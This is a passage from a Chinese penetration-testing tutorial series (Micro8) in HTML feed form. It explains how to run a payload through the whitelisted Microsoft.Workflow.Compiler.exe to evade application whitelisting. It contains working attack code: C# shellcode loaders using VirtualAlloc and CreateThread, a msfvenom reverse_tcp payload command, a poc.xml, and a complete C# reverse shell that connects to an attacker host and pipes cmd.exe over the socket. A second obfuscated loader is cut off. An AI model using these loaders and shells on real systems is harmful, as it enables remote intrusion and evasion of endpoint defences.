class="number">0</span>, (UInt32)shellcode .Length,</span><br><span class="line"></span><br><span class="line">MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">Marshal.Copy(shellcode , <span class="number">0</span>, (IntPtr)(funcAddr), shellcode .Length);</span><br><span class="line"></span><br><span class="line">IntPtr hThread = IntPtr.Zero;</span><br><span class="line"></span><br><span class="line">UInt32 threadId = <span class="number">0</span>; </span><br><span class="line"></span><br><span class="line">IntPtr pinfo = IntPtr.Zero; </span><br><span class="line"></span><br><span class="line">hThread = CreateThread(<span class="number">0</span>, <span class="number">0</span>, funcAddr, pinfo, <span class="number">0</span>, <span class="keyword">ref</span> threadId);</span><br><span class="line"></span><br><span class="line">WaitForSingleObject(hThread, <span class="number">0xFFFFFFFF</span>); </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> UInt32 MEM_COMMIT = <span class="number">0x1000</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> UInt32 PAGE_EXECUTE_READWRITE = <span class="number">0x40</span>; </span><br><span class="line"></span><br><span class="line">[<span class="meta">DllImport(<span class="meta-string">"kernel32"</span>)</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">VirtualAlloc</span>(<span class="params">UInt32 lpStartAddr,UInt32 size, UInt32 flAllocationType, UInt32 flProtect</span>)</span>; </span><br><span class="line"></span><br><span class="line">[<span class="meta">DllImport(<span class="meta-string">"kernel32"</span>)</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="keyword">bool</span> <span class="title">VirtualFree</span>(<span class="params">IntPtr lpAddress,</span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">UInt32 dwSize, UInt32 dwFreeType</span>)</span>; </span><br><span class="line"></span><br><span class="line">[<span class="meta">DllImport(<span class="meta-string">"kernel32"</span>)</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">CreateThread</span>(<span class="params"> </span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">UInt32 lpThreadAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">UInt32 dwStackSize,</span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">UInt32 lpStartAddress,</span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">IntPtr param,</span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">UInt32 dwCreationFlags,</span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">ref</span> UInt32 lpThreadId</span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params"></span>)</span>;</span><br><span class="line"></span><br><span class="line">[<span class="meta">DllImport(<span class="meta-string">"kernel32"</span>)</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="keyword">bool</span> <span class="title">CloseHandle</span>(<span class="params">IntPtr handle</span>)</span>; </span><br><span class="line"></span><br><span class="line">[<span class="meta">DllImport(<span class="meta-string">"kernel32"</span>)</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">WaitForSingleObject</span>(<span class="params"> </span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">IntPtr hHandle,</span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">UInt32 dwMilliseconds</span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params"></span>)</span>;</span><br><span class="line"></span><br><span class="line">[<span class="meta">DllImport(<span class="meta-string">"kernel32"</span>)</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">GetModuleHandle</span>(<span class="params"> </span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">string</span> moduleName </span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params"></span>)</span>;</span><br><span class="line"></span><br><span class="line">[<span class="meta">DllImport(<span class="meta-string">"kernel32"</span>)</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">GetProcAddress</span>(<span class="params"> </span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">IntPtr hModule,</span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">string</span> procName </span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params"></span>)</span>;</span><br><span class="line"></span><br><span class="line">[<span class="meta">DllImport(<span class="meta-string">"kernel32"</span>)</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">LoadLibrary</span>(<span class="params"> </span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">string</span> lpFileName </span></span></span><br><span class="line"><span class="function"><span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params"></span>)</span>;</span><br><span class="line"></span><br><span class="line">[<span class="meta">DllImport(<span class="meta-string">"kernel32"</span>)</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">GetLastError</span>(<span class="params"></span>)</span>; </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>  Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>76、基于白名单Compiler.exe执行payload第六季</title>
      <link href="/article/76_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%85%AD%E5%AD%A3.html"/>
      <url>/article/76_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%85%AD%E5%AD%A3.html</url>
      
        <content type="html"><![CDATA[<p><strong>注：</strong>请多喝点热水或者凉白开，身体特别重要。</p><p><strong>说明：</strong>Microsoft.Workflow.Compiler.exe所在路径没有被系统添加PATH环境变量中，因此，Microsoft.Workflow.Compiler命令无法识别。</p><p>基于白名单Microsoft.Workflow.Compiler.exe配置payload：</p><p>Windows 7 默认位置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe</span><br></pre></td></tr></table></figure><p><strong>攻击机：</strong>192.168.1.4 Debian<br><strong>靶机：</strong>192.168.1.3 Windows 7</p><h3 id="配置攻击机msf："><a href="#配置攻击机msf：" class="headerlink" title="配置攻击机msf："></a>配置攻击机msf：</h3><p><img src="../do/media/47453f0e7a3b60f14589ea8f102ea82d.jpg" alt></p><h3 id="靶机执行："><a href="#靶机执行：" class="headerlink" title="靶机执行："></a>靶机执行：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe poc.xml Micropoor.tcp</span><br></pre></td></tr></table></figure><p><img src="../do/media/40c67a6cba66cafda51b2c0e4f60324e.jpg" alt>  </p><p><img src="../do/media/e9cdf8ac5b498f1251f1b7cdb66d7df5.jpg" alt></p><h3 id="结合meterpreter："><a href="#结合meterpreter：" class="headerlink" title="结合meterpreter："></a>结合meterpreter：</h3><p><strong>注：payload.cs需要用到System.Workflow.Activities</strong></p><p><strong>靶机执行：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe poc.xml Micropoor_rev1.cs</span><br></pre></td></tr></table></figure><p><strong>配置攻击机msf：</strong><br><img src="../do/media/fbf3bad26108f56a22bd8c15744731aa.jpg" alt></p><p><strong>payload生成：</strong>  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom ‐p windows/x64/shell/reverse_tcp LHOST=192.168.1.4 LPORT=53 ‐ f csharp</span><br></pre></td></tr></table></figure><p><img src="../do/media/a66c514584809a6a9cb7a751c04dd23a.jpg" alt></p><h3 id="附录：poc-xml"><a href="#附录：poc-xml" class="headerlink" title="附录：poc.xml"></a>附录：poc.xml</h3><p><strong>注：windows/shell/reverse_tcp</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf‐8"?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">CompilerInput</span> <span class="attr">xmlns:i</span>=<span class="string">"http://www.w3.org/2001/XMLSchema‐instance"</span> <span class="attr">xmlns</span>=<span class="string">"http://schemas.datacontract.org/2004/07/Microsoft.Workflow.Compiler"</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line">&lt;files xmlns:d2p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays"&gt;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">d2p1:string</span>&gt;</span>Micropoor.tcp<span class="tag">&lt;/<span class="name">d2p1:string</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">files</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">parameters</span> <span class="attr">xmlns:d2p1</span>=<span class="string">"http://schemas.datacontract.org/2004/07/System.Workflow.ComponentModel.Compiler"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">assemblyNames</span> <span class="attr">xmlns:d3p1</span>=<span class="string">"http://schemas.microsoft.com/2003/10/Serialization/Arrays"</span> <span class="attr">xmlns</span>=<span class="string">"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">compilerOptions</span> <span class="attr">i:nil</span>=<span class="string">"true"</span> <span class="attr">xmlns</span>=<span class="string">"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">coreAssemblyFileName</span> <span class="attr">xmlns</span>=<span class="string">"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"</span>&gt;</span><span class="tag">&lt;/<span class="name">coreAssemblyFileName</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">embeddedResources</span> <span class="attr">xmlns:d3p1</span>=<span class="string">"http://schemas.microsoft.com/2003/10/Serialization/Arrays"</span> <span class="attr">xmlns</span>=<span class="string">"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">evidence</span> <span class="attr">xmlns:d3p1</span>=<span class="string">"http://schemas.datacontract.org/2004/07/System.Security.Policy"</span> <span class="attr">i:nil</span>=<span class="string">"true"</span> <span class="attr">xmlns</span>=<span class="string">"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">generateExecutable</span> <span class="attr">xmlns</span>=<span class="string">"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"</span>&gt;</span>false<span class="tag">&lt;/<span class="name">generateExecutable</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">generateInMemory</span> <span class="attr">xmlns</span>=<span class="string">"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"</span>&gt;</span>true<span class="tag">&lt;/<span class="name">generateInMemory</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">includeDebugInformation</span> <span class="attr">xmlns</span>=<span class="string">"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"</span>&gt;</span>false<span class="tag">&lt;/<span class="name">includeDebugInformation</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">linkedResources</span> <span class="attr">xmlns:d3p1</span>=<span class="string">"http://schemas.microsoft.com/2003/10/Serialization/Arrays"</span> <span class="attr">xmlns</span>=<span class="string">"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">mainClass</span> <span class="attr">i:nil</span>=<span class="string">"true"</span> <span class="attr">xmlns</span>=<span class="string">"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">outputName</span> <span class="attr">xmlns</span>=<span class="string">"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"</span>&gt;</span><span class="tag">&lt;/<span class="name">outputName</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">tempFiles</span> <span class="attr">i:nil</span>=<span class="string">"true"</span> <span class="attr">xmlns</span>=<span class="string">"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">treatWarningsAsErrors</span> <span class="attr">xmlns</span>=<span class="string">"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"</span>&gt;</span>false<span class="tag">&lt;/<span class="name">treatWarningsAsErrors</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">warningLevel</span> <span class="attr">xmlns</span>=<span class="string">"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"</span>&gt;</span>‐1<span class="tag">&lt;/<span class="name">warningLevel</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">win32Resource</span> <span class="attr">i:nil</span>=<span class="string">"true"</span> <span class="attr">xmlns</span>=<span class="string">"http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">d2p1:checkTypes</span>&gt;</span>false<span class="tag">&lt;/<span class="name">d2p1:checkTypes</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">d2p1:compileWithNoCode</span>&gt;</span>false<span class="tag">&lt;/<span class="name">d2p1:compileWithNoCode</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">d2p1:compilerOptions</span> <span class="attr">i:nil</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">d2p1:generateCCU</span>&gt;</span>false<span class="tag">&lt;/<span class="name">d2p1:generateCCU</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">d2p1:languageToUse</span>&gt;</span>CSharp<span class="tag">&lt;/<span class="name">d2p1:languageToUse</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">d2p1:libraryPaths</span> <span class="attr">xmlns:d3p1</span>=<span class="string">"http://schemas.microsoft.com/2003/10/Serialization/Arrays"</span> <span class="attr">i:nil</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">d2p1:localAssembly</span> <span class="attr">xmlns:d3p1</span>=<span class="string">"http://schemas.datacontract.org/2004/07/System.Reflection"</span> <span class="attr">i:nil</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">d2p1:mtInfo</span> <span class="attr">i:nil</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">d2p1:userCodeCCUs</span> <span class="attr">xmlns:d3p1</span>=<span class="string">"http://schemas.datacontract.org/2004/07/System.CodeDom"</span> <span class="attr">i:nil</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">parameters</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">CompilerInput</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>Micropoor.tcp：</strong></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> System.ComponentModel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> System.Net;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> System.Net.Sockets;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> System.Workflow.Activities; </span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Program</span> : <span class="title">SequentialWorkflowActivity</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> StreamWriter streamWriter; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Program</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span>(TcpClient client = <span class="keyword">new</span> TcpClient(<span class="string">"192.168.1.4"</span>, <span class="number">53</span>))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span>(Stream stream = client.GetStream())</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span>(StreamReader rdr = <span class="keyword">new</span> StreamReader(stream))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">streamWriter = <span class="keyword">new</span> StreamWriter(stream); </span><br><span class="line"></span><br><span class="line">StringBuilder strInput = <span class="keyword">new</span> StringBuilder(); </span><br><span class="line"></span><br><span class="line">Process p = <span class="keyword">new</span> Process();</span><br><span class="line"></span><br><span class="line">p.StartInfo.FileName = <span class="string">"cmd.exe"</span>;</span><br><span class="line"></span><br><span class="line">p.StartInfo.CreateNoWindow = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">p.StartInfo.UseShellExecute = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">p.StartInfo.RedirectStandardOutput = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">p.StartInfo.RedirectStandardInput = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">p.StartInfo.RedirectStandardError = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">p.OutputDataReceived += <span class="keyword">new</span> DataReceivedEventHandler(CmdOutputDataHandler);</span><br><span class="line"></span><br><span class="line">p.Start();</span><br><span class="line"></span><br><span class="line">p.BeginOutputReadLine(); </span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">strInput.Append(rdr.ReadLine());</span><br><span class="line"></span><br><span class="line">p.StandardInput.WriteLine(strInput);</span><br><span class="line"></span><br><span class="line">strInput.Remove(<span class="number">0</span>, strInput.Length);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">CmdOutputDataHandler</span>(<span class="params"><span class="keyword">object</span> sendingProcess, DataReceivedEventArgs outLine</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">StringBuilder strOutput = <span class="keyword">new</span> StringBuilder(); </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!String.IsNullOrEmpty(outLine.Data))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">strOutput.Append(outLine.Data);</span><br><span class="line"></span><br><span class="line">streamWriter.WriteLine(strOutput);</span><br><span class="line"></span><br><span class="line">streamWriter.Flush();</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">catch</span> (Exception err) &#123; &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Micropoor-rev1-cs："><a href="#Micropoor-rev1-cs：" class="headerlink" title="Micropoor_rev1.cs："></a>Micropoor_rev1.cs：</h3><p><strong>注：x64 payload</strong></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> System.Workflow.Activities;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> System.Net;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> System.Net.Sockets;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> System.Runtime.InteropServices;</span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> System.Threading;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title">yrDaTlg</span> : <span class="title">SequentialWorkflowActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">[<span class="meta">DllImport(<span class="meta-string">"kernel32"</span>)</span>] <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">VirtualAlloc</span>(<span class="params">UInt32 rCfMkmxRSAakg,UInt32 qjRsrljIMB, UInt32 peXiTuE, UInt32 AkpADfOOAVBZ</span>)</span>;</span><br><span class="line"></span><br><span class="line">[<span 